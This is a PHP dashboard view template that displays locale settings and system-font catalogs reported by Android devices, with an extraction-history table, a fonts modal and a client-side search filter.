<?php /** @var array $rows @var int $total @var object $pager @var string $nav_urls */ ?>
<?php
helper('coalesce');
$rows = coalesce_snapshots(
    $rows,
    'device_id',
    ['locale_region'],
    ['system_fonts']
);

// Process all rows to parse locale region and font details
foreach ($rows as &$row) {
    $locale = $row['locale_region'] ?? [];
    $fonts = $row['system_fonts'] ?? [];
    $row['font_count'] = is_array($fonts) ? count($fonts) : 0;
    $row['font_scale'] = $locale['font_scale'] ?? '—';
    $row['timezone'] = $locale['timezone'] ?? '—';
    $row['display_name'] = $locale['display_name'] ?? '—';
    $row['text_layout_direction'] = $locale['text_layout_direction'] ?? '—';
    $row['language'] = $locale['language'] ?? '—';
    $row['country'] = $locale['country'] ?? '—';
}
unset($row);
$latest = !empty($rows) ? $rows[0] : null;
$latestLocale = $latest['locale_region'] ?? [];
$latestFonts = $latest['system_fonts'] ?? [];
?>

<style>
.loc-card       { border-radius:8px; background:#fff; box-shadow:0 0 1px rgba(0,0,0,.125),0 1px 3px rgba(0,0,0,.2); }
.loc-hero       { background:linear-gradient(135deg,#1f4068 0%,#162447 60%,#1b1b2f 100%); border-radius:8px 8px 0 0; padding:18px 22px; color:#fff; }
.loc-kv         { display:flex; justify-content:space-between; align-items:center; padding:7px 0; border-bottom:1px solid #f0f0f0; font-size:13px; }
.loc-kv:last-child { border-bottom:none; }
.loc-kv .lk     { color:#6c757d; font-weight:600; font-size:11px; text-transform:uppercase; }
.loc-kv .lv     { font-weight:700; color:#343a40; }
.font-pill      { display:inline-block; font-family:monospace; background:#e9ecef; border-radius:4px; padding:2px 6px; font-size:10px; color:#495057; margin:2px 0; }
.font-row:hover { background: rgba(0, 123, 255, 0.05) !important; }
</style>

<div class="content-wrapper">
    <!-- Page Header -->
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-3 align-items-center">
                <div class="col-lg-7">
                    <div class="d-flex align-items-center flex-wrap">
                        <h1 class="h2 mb-0 mr-3">
                            <i class="fas fa-globe text-primary mr-2"></i>System Locale &amp; Fonts
                        </h1>
                        <span class="badge badge-secondary border p-2 text-white">
                            <i class="fas fa-database mr-1"></i>Total Snapshots: <b><?= (int)$total ?></b>
                        </span>
                    </div>
                    <p class="text-muted mt-1 mb-0">System language, regional formats, active timezones, font scaling limits, and registered filesystem fonts.</p>
                </div>
                <div class="col-lg-5 text-right"><?= $nav_urls ?></div>
            </div>

            <!-- Upgraded Security Callout -->
            <div class="callout callout-info shadow-sm p-3 mb-4" style="border-left:5px solid #007bff;background:#fdfdfd;border-radius:4px;">
                <h5 class="font-weight-bold text-primary"><i class="fas fa-shield-alt mr-2"></i>Locale &amp; Typography Auditing</h5>
                <p class="text-secondary mb-2" style="font-size:14px;">Monitoring regional configurations detects geographical spoofing or localization inconsistencies. Cataloging system font signatures detects hidden font files or injected assets commonly used in layout exploit payloads.</p>
                <div class="row" style="font-size:12px;">
                    <div class="col-md-6 border-right">
                        <b class="d-block mb-1">Geographic Alignment:</b>
                        <span class="text-muted">Inconsistent language settings compared to actual network IPs indicate routing proxy usage or device spoofing.</span>
                    </div>
                    <div class="col-md-6 pl-md-3">
                        <b class="d-block mb-1">Font File Signatures:</b>
                        <span class="text-muted">Extracting registered system font directories lists custom assets loaded by system layers or third-party keyboards.</span>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Main Content -->
    <section class="content">
        <div class="container-fluid">

            <?php if ($latest): ?>
                <div class="row">
                    <!-- Locale Region Card -->
                    <div class="col-md-6">
                        <div class="loc-card mb-4">
                            <div class="loc-hero">
                                <div class="d-flex justify-content-between align-items-center">
                                    <div>
                                        <div class="dev-brand" style="text-transform: uppercase; font-size: 10px; opacity: 0.8; letter-spacing: 1px;">Primary Configuration</div>
                                        <div style="font-size: 20px; font-weight: 800;"><?= htmlspecialchars($latest['display_name']) ?></div>
                                    </div>
                                    <div class="text-right">
                                        <span class="badge badge-light text-primary font-weight-bold px-2 py-1" style="font-size: 13px;">
                                            <?= htmlspecialchars($latest['language']) ?>-<?= htmlspecialchars($latest['country']) ?>
                                        </span>
                                    </div>
                                </div>
                            </div>
                            <div class="card-body p-3">
                                <div class="loc-kv">
                                    <span class="lk"><i class="fas fa-language mr-1 text-muted"></i> Language</span>
                                    <span class="lv"><?= htmlspecialchars($latest['language']) ?></span>
                                </div>
                                <div class="loc-kv">
                                    <span class="lk"><i class="fas fa-flag mr-1 text-muted"></i> Country / Region</span>
                                    <span class="lv"><?= htmlspecialchars($latest['country']) ?></span>
                                </div>
                                <div class="loc-kv">
                                    <span class="lk"><i class="fas fa-clock mr-1 text-muted"></i> Timezone</span>
                                    <span class="lv"><code style="font-weight:700;"><?= htmlspecialchars($latest['timezone']) ?></code></span>
                                </div>
                                <div class="loc-kv">
                                    <span class="lk"><i class="fas fa-align-left mr-1 text-muted"></i> Text Direction</span>
                                    <span class="lv"><span class="badge badge-light border"><?= htmlspecialchars($latest['text_layout_direction']) ?></span></span>
                                </div>
                                <div class="loc-kv">
                                    <span class="lk"><i class="fas fa-font mr-1 text-muted"></i> Font Scale Limit</span>
                                    <span class="lv"><span class="badge badge-info"><?= htmlspecialchars($latest['font_scale']) ?>x</span></span>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Fonts Overview Card -->
                    <div class="col-md-6">
                        <div class="card card-outline card-success shadow-sm mb-4 h-100">
                            <div class="card-body d-flex flex-column align-items-center justify-content-center text-center py-4">
                                <div class="mb-3">
                                    <i class="fas fa-font fa-4x text-success" style="opacity: 0.85;"></i>
                                </div>
                                <h4 class="font-weight-bold text-success">System Typography</h4>
                                <p class="text-muted small px-3">
                                    The device has reported <strong><?= count($latestFonts) ?></strong> registered system font packages. These files handle the rendering profiles for the user interface.
                                </p>
                                <button type="button" class="btn btn-success px-4 font-weight-bold" data-toggle="modal" data-target="#fontsModal">
                                    <i class="fas fa-search mr-1"></i> View Fonts Catalog
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            <?php endif; ?>

            <!-- Extraction History Table -->
            <div class="card card-secondary card-outline shadow-sm">
                <div class="card-header">
                    <h3 class="card-title font-weight-bold">
                        <i class="fas fa-history mr-2"></i>Extraction History
                    </h3>
                </div>
                <div class="card-body p-0">
                    <div class="table-responsive">
                        <table class="table table-hover table-striped mb-0">
                            <thead class="thead-light">
                                <tr>
                                    <th>Extracted</th>
                                    <th>Device ID</th>
                                    <th>Language</th>
                                    <th>Country</th>
                                    <th>Timezone</th>
                                    <th>Font Scale</th>
                                    <th>Fonts Cataloged</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php if (empty($rows)): ?>
                                    <tr>
                                        <td colspan="7" class="text-center py-5">
                                            <div class="empty-state">
                                                <i class="fas fa-inbox fa-3x text-muted mb-3"></i>
                                                <h4>No System Locale Data</h4>
                                                <p class="text-muted">Data will appear here once extracted from the Android app.</p>
                                            </div>
                                        </td>
                                    </tr>
                                <?php else: foreach ($rows as $r): ?>
                                    <tr>
                                        <td>
                                            <span class="badge badge-light border p-2">
                                                <i class="fas fa-clock mr-1 text-muted"></i>
                                                <?= !empty($r['extracted_at']) ? date('M d, Y H:i', $r['extracted_at'] / 1000) : 'N/A' ?>
                                            </span>
                                        </td>
                                        <td><code><?= htmlspecialchars($r['device_id'] ?? 'N/A') ?></code></td>
                                        <td><strong><?= htmlspecialchars($r['language'] ?? '—') ?></strong></td>
                                        <td><strong><?= htmlspecialchars($r['country'] ?? '—') ?></strong></td>
                                        <td><code><?= htmlspecialchars($r['timezone'] ?? '—') ?></code></td>
                                        <td><span class="badge badge-info"><?= htmlspecialchars($r['font_scale'] ?? '—') ?>x</span></td>
                                        <td><span class="badge badge-success"><?= (int)$r['font_count'] ?> fonts</span></td>
                                    </tr>
                                <?php endforeach; endif; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
                <?php if (isset($pager) && $total > 25): ?>
                    <div class="card-footer clearfix">
                        <div class="float-right">
                            <?= $pager->links('default', 'bootstrap5_full') ?>
                        </div>
                    </div>
                <?php endif; ?>
            </div>

        </div>
    </section>
</div>

<!-- System Fonts Catalog Modal -->
<?php if ($latest && !empty($latestFonts)): ?>
<div class="modal fade" id="fontsModal" tabindex="-1" role="dialog" aria-labelledby="fontsModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-lg modal-dialog-centered modal-dialog-scrollable" role="document">
        <div class="modal-content" style="border-radius: 8px;">
            <div class="modal-header bg-light">
                <h5 class="modal-title font-weight-bold text-success" id="fontsModalLabel">
                    <i class="fas fa-font mr-2"></i>System Fonts Catalog (<?= count($latestFonts) ?>)
                </h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body p-0">
                <!-- Search bar inside modal to avoid space clutter -->
                <div class="p-3 bg-light border-bottom">
                    <div class="input-group">
                        <div class="input-group-prepend">
                            <span class="input-group-text bg-white border-right-0"><i class="fas fa-search text-muted"></i></span>
                        </div>
                        <input type="text" id="modalFontSearch" class="form-control border-left-0" placeholder="Filter active fonts by name or filepath...">
                    </div>
                </div>
                <div class="table-responsive">
                    <table class="table table-sm table-striped table-hover mb-0" id="modalFontsTable">
                        <thead class="bg-light">
                            <tr>
                                <th style="width: 40%;" class="pl-3">Font Name</th>
                                <th style="width: 40%;">File Path</th>
                                <th style="width: 10%;">Weight</th>
                                <th style="width: 10%;">Style</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($latestFonts as $font): ?>
                                <?php
                                $filePath = $font['path'] ?? $font['file'] ?? '';
                                $fontName = $font['name'] ?? $font['font_name'] ?? $font['font_family'] ?? basename($filePath);
                                $fontStyle = $font['style'] ?? $font['font_style'] ?? 'Normal';
                                $fontWeight = $font['weight'] ?? $font['font_weight'] ?? '400';
                                ?>
                                <tr class="font-row">
                                    <td class="pl-3 font-weight-bold"><?= htmlspecialchars($fontName) ?></td>
                                    <td><span class="font-pill"><?= htmlspecialchars($filePath) ?></span></td>
                                    <td><span class="badge badge-secondary"><?= htmlspecialchars($fontWeight) ?></span></td>
                                    <td><span class="badge badge-light border small"><?= htmlspecialchars($fontStyle) ?></span></td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>
            <div class="modal-footer bg-light">
                <button type="button" class="btn btn-secondary font-weight-bold" data-dismiss="modal">Close Catalog</button>
            </div>
        </div>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('modalFontSearch')?.addEventListener('keyup', function() {
        var kw = this.value.toLowerCase();
        document.querySelectorAll('#modalFontsTable tbody tr').forEach(function(row) {
            row.style.display = row.textContent.toLowerCase().indexOf(kw) > -1 ? '' : 'none';
        });
    });
});
</script>
<?php endif; ?>

<?php include __DIR__ . '/_adv_delete_script.php'; ?>
